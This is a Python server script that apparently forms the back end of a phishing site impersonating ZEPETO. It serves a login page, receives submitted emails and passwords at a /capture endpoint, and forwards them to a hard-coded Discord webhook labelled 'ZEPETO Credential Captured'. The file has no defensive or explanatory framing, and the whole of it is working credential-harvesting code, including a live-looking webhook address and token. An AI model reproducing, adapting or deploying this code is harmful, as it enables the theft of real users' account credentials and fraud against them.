from http.server import HTTPServer, SimpleHTTPRequestHandler
import os, json, urllib.request, io

class Handler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/capture':
            length = int(self.headers['Content-Length'])
            body = self.rfile.read(length).decode()
            params = dict(p.split('=') for p in body.split('&'))
            email = urllib.parse.unquote_plus(params.get('email', ''))
            password = urllib.parse.unquote_plus(params.get('password', ''))
            
            # Send to Discord
            import urllib.parse
            payload = json.dumps({
                'content': f"🔴 ZEPETO Credential Captured\nEmail: `{email}`\nPassword: `{password}`"
            }).encode()
            
            req = urllib.request.Request(
                'https://discord.com/api/webhooks/1525191917468647514/b8qkmd69Vl2JyctJjiEqSq6jYYwME1rCN0WJKzgefO3RVuLBlV8QppSTcP-f3-IRDjEy',
                data=payload,
                headers={'Content-Type': 'application/json'}
            )
            try:
                urllib.request.urlopen(req, timeout=5)
            except:
                pass
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_error(404)
    
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return SimpleHTTPRequestHandler.do_GET(self)

port = int(os.environ.get('PORT', 10000))
server = HTTPServer(('0.0.0.0', port), Handler)
server.serve_forever()
